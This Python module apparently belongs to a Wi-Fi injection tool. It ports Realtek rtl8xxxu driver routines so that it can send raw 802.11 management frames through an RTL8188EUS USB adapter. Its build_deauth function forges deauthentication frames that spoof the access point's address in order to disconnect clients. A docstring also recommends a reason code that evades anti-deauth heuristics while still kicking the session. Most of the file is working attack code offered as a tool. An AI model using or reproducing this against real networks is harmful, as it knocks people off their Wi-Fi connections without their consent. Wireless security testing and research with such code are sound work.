"""RTL8188EUS TX path — MGMT-frame inject (deauth).

Cleanroom port of:

* `rtl8xxxu_txdesc32` layout      — `rtl8xxxu.h:400-412` (32-byte descriptor)
* `rtl8xxxu_tx` setup tail        — `core.c:5400-5530` (txdw0/txdw1, queue pick)
* `rtl8xxxu_fill_txdesc_v3` MGMT  — `core.c:5357-5362` + `5395-5397`
* `rtl8xxxu_calc_tx_desc_csum`    — `core.c:5025-5041` (XOR-16 over the desc)

Scope: management-frame injection (deauth in particular). Data frames,
aggregation, and TX-report consumption are out of scope.

Wire layout of a sent URB:

    [32-byte txdesc32]  [MPDU bytes — typically 26 for a deauth]

The chip computes the actual on-air FCS; we don't append one.
"""
from __future__ import annotations

import logging
import struct
from typing import Sequence

import usb.core

from .constants import (
    FC0_SUBTYPE_DEAUTH,
    FC0_TYPE_MGMT,
    REASON_CODE_CLASS3_FRAME,
    TX_DESC_SZ_8188E,
    TXDESC32_RETRY_LIMIT_ENABLE,
    TXDESC32_RETRY_LIMIT_MGNT,
    TXDESC32_RETRY_LIMIT_SHIFT,
    TXDESC32_USE_DRIVER_RATE,
    TXDESC40_AGG_BREAK,
    TXDESC_ANTENNA_SELECT_A,
    TXDESC_ANTENNA_SELECT_B,
    TXDESC_ANTENNA_SELECT_C,
    TXDESC_BROADMULTICAST,
    TXDESC_FIRST_SEGMENT,
    TXDESC_LAST_SEGMENT,
    TXDESC_OWN,
    TXDESC_QUEUE_MGNT,
    TXDESC_QUEUE_SHIFT,
)

logger = logging.getLogger(__name__)


# Default bulk-OUT endpoint for the MGMT queue. Set by the kernel via
# `priv->pipe_out[TXDESC_QUEUE_MGNT]` after `init_queue_priority` decides
# which physical EP is the HIGH lane. With our 2-EP convention (EP 0x02
# = HIGH, EP 0x03 = NORMAL — see `mac.init_queue_priority_2ep`), MGMT
# lands on the first bulk-OUT, EP 0x02.
DEFAULT_MGMT_BULK_OUT = 0x02


def pick_bulk_out_mgmt(bulk_out_eps: Sequence[int]) -> int:
    """Pick the bulk-OUT endpoint that the MGMT queue routes to.

    Mirrors the kernel's `priv->pipe_out[TXDESC_QUEUE_MGNT] =
    priv->out_ep[mgp=0]` (core.c:2705): the FIRST bulk-OUT endpoint
    (lowest address) maps to the HIGH lane which carries MGMT.
    """
    if not bulk_out_eps:
        raise RuntimeError("no bulk-OUT endpoints found on this device")
    return min(bulk_out_eps)


# ---- frame builders -------------------------------------------------


def build_deauth(bssid: bytes, client: bytes, reason: int = REASON_CODE_CLASS3_FRAME) -> bytes:
    """Build a 26-byte 802.11 Deauthentication frame (subtype 0xC).

    Frame layout (802.11-2020 9.3.3.13):

        | fc[2] | duration[2] | addr1=client[6] | addr2=bssid[6] | addr3=bssid[6] | seq[2] | reason[2] |

    - `addr1` is the destination (client being kicked, or `ff:..:ff` for bcast).
    - `addr2` is the source — we pretend to be the AP, so this is BSSID.
    - `addr3` is BSSID (mandatory in MGMT frames).
    - Sequence number is left at 0; the chip's seq counter takes over in fill_txdesc_v3.

    Reason codes: 0x07 (class-3 frame from non-associated STA) is a common
    "polite" disassociate that won't trigger anti-deauth heuristics on
    well-behaved clients but still kicks the session.
    """
    if len(bssid) != 6:
        raise ValueError(f"bssid must be 6 bytes, got {len(bssid)}")
    if len(client) != 6:
        raise ValueError(f"client must be 6 bytes, got {len(client)}")
    fc0 = FC0_TYPE_MGMT | FC0_SUBTYPE_DEAUTH
    return struct.pack(
        "<BBH6s6s6sHH",
        fc0,           # fc[0]
        0x00,          # fc[1]: ToDS=0, FromDS=0, no flags
        0x013A,        # Duration: 314 µs (typical mgmt frame duration value)
        client,        # addr1: destination
        bssid,         # addr2: source (we spoof the AP)
        bssid,         # addr3: BSSID
        0,             # seq_ctrl (chip will overwrite)
        reason,        # body: reason code
    )


# ---- descriptor builder ---------------------------------------------


def build_tx_desc_mgmt(pkt_len: int, is_broadcast: bool,
                       retry_limit: int = TXDESC32_RETRY_LIMIT_MGNT) -> bytearray:
    """Construct a 32-byte tx descriptor for a MGMT frame.

    Mirrors `rtl8xxxu_tx` (core.c:5449-5466) for the common header +
    `rtl8xxxu_fill_txdesc_v3` MGMT branch (core.c:5357-5362, 5395-5397).
    `retry_limit` fills the txdw5 retry-limit field (default 6, the vendor MGMT value); the
    inject path passes its own HW ACK-retry limit. Checksum is NOT computed here — caller must
    call `calc_tx_desc_csum` on the finished descriptor + MPDU layout (csum field cleared first).
    """
    desc = bytearray(TX_DESC_SZ_8188E)

    # Common header (txdw0 = byte 3 of word 0):
    #   pkt_size = MPDU length          (bytes 0-1, LE u16)
    #   pkt_offset = descriptor size    (byte 2, u8)
    #   txdw0 = OWN | FIRST_SEG | LAST_SEG  (byte 3, u8)
    struct.pack_into("<H", desc, 0, pkt_len)
    desc[2] = TX_DESC_SZ_8188E
    txdw0 = TXDESC_OWN | TXDESC_FIRST_SEGMENT | TXDESC_LAST_SEGMENT
    if is_broadcast:
        txdw0 |= TXDESC_BROADMULTICAST
    desc[3] = txdw0

    # txdw1: queue = MGMT (0x12) shifted into bits[12:8]
    txdw1 = TXDESC_QUEUE_MGNT << TXDESC_QUEUE_SHIFT
    struct.pack_into("<I", desc, 4, txdw1)

    # txdw2: AGG_BREAK (we're not aggregating) + antenna A + B (fill_txdesc_v3
    # always sets these — core.c:5355 + 5395-5396).
    txdw2 = TXDESC40_AGG_BREAK | TXDESC_ANTENNA_SELECT_A | TXDESC_ANTENNA_SELECT_B
    struct.pack_into("<I", desc, 8, txdw2)

    # txdw3: sequence number left at 0; chip's seq counter takes over.
    # (fill_txdesc_v3 line 5350 sets it from skb seq_ctrl; we use 0.)

    # txdw4: USE_DRIVER_RATE (for MGMT — line 5359)
    txdw4 = TXDESC32_USE_DRIVER_RATE
    struct.pack_into("<I", desc, 16, txdw4)

    # txdw5: rate=0 (1Mbps CCK — most robust), retry limit + enable (lines 5358-5361)
    txdw5 = (
        0  # rate field, low 8 bits
        | ((retry_limit & 0x3F) << TXDESC32_RETRY_LIMIT_SHIFT)
        | TXDESC32_RETRY_LIMIT_ENABLE
    )
    struct.pack_into("<I", desc, 20, txdw5)

    # txdw6: 0 (unused for MGMT)

    # csum at bytes 28-29 — left 0 here, filled by calc_tx_desc_csum.

    # txdw7 (bytes 30-31): high half of ANTENNA_SELECT_C (line 5397)
    #   ANTENNA_SELECT_C = BIT(29), so >> 16 places it in bit 13 of txdw7.
    struct.pack_into("<H", desc, 30, (TXDESC_ANTENNA_SELECT_C >> 16) & 0xFFFF)

    return desc


def calc_tx_desc_csum(desc: bytearray) -> None:
    """Port of `rtl8xxxu_calc_tx_desc_csum` (core.c:5025-5041).

    XOR-16 over the 32-byte descriptor with the `csum` field (bytes
    28-29) cleared first, result stored back into csum bytes.
    """
    desc[28] = 0
    desc[29] = 0
    csum = 0
    for i in range(0, TX_DESC_SZ_8188E, 2):
        csum ^= int.from_bytes(desc[i : i + 2], "little")
    csum &= 0xFFFF
    desc[28] = csum & 0xFF
    desc[29] = (csum >> 8) & 0xFF


# ---- bulk-OUT send --------------------------------------------------


def send_mgmt_frame(
    dev: usb.core.Device,
    ep_out: int,
    mpdu: bytes,
    *,
    is_broadcast: bool = False,
    retry_limit: int = TXDESC32_RETRY_LIMIT_MGNT,
    timeout_ms: int = 200,
) -> int:
    """Send a single MGMT frame: build descriptor, checksum, bulk-OUT write.

    `retry_limit` is threaded into the TX descriptor's retry-limit field (default 6). Returns
    the number of bytes actually written (descriptor + MPDU). Raises `usb.core.USBError` on
    USB-level failure (e.g. timeout, pipe stall, no device).
    """
    desc = build_tx_desc_mgmt(len(mpdu), is_broadcast, retry_limit=retry_limit)
    calc_tx_desc_csum(desc)
    urb = bytes(desc) + mpdu
    written = dev.write(ep_out, urb, timeout_ms)
    if written != len(urb):
        raise IOError(
            f"bulk-OUT short write: sent {written}, expected {len(urb)}"
        )
    return written
